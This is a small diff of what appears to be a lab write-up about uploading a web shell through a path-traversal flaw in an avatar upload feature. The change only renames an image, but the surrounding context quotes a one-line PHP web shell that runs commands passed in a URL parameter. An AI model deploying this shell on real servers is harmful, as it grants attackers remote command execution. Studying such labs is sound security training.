@@ -31,7 +31,7 @@ I even updated the email and we see an `avatar` upload functionality let's try u
 <?php system($_GET['cmd']); ?>
 ```
 
-![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714721496.webp)
+![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716581184.webp)
 
 And here we have the request.
 
